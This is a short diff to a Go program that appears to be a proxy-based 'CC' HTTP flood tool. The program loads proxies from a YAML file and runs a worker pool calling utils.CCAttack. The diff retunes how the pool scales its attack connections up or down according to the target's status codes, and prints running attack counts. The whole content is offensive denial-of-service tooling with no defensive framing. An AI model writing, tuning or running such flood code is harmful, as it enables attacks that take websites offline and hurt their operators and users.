@@ -13,7 +13,6 @@ import (
 )
 
 func main() {
-	defer ants.Release()
 	var wg sync.WaitGroup
 	buf, err := ioutil.ReadFile("proxies.yaml")
 	if err != nil {
@@ -69,15 +68,16 @@ func main() {
 		_, _ = utils.CCAttack(&p, &counts, &status)
 		wg.Done()
 	})
+	defer pool2.Release()
 
 	//monitor status
 	go func() {
 		for {
 			switch {
-			case (status == 502 || status == 404) && pool2.Cap() > 24:
+			case status == 502 && pool2.Cap() > 24:
 				pool2.Tune(pool2.Cap() - 10)
-			case status < 500 && status > 0 && pool2.Cap() < 4*config.Cfg.Connections:
-				pool2.Tune(pool2.Cap() + 50)
+			case status <= 500 && status > 0 && pool2.Cap() < 3*config.Cfg.Connections:
+				pool2.Tune(pool2.Cap() + 20)
 			}
 			fmt.Printf("Total attack: %d [%d nodes] - Current connection: %d - StatusCode: %d\n", counts, len(alivePlist), pool2.Running(), status)
 			time.Sleep(5 * time.Second)
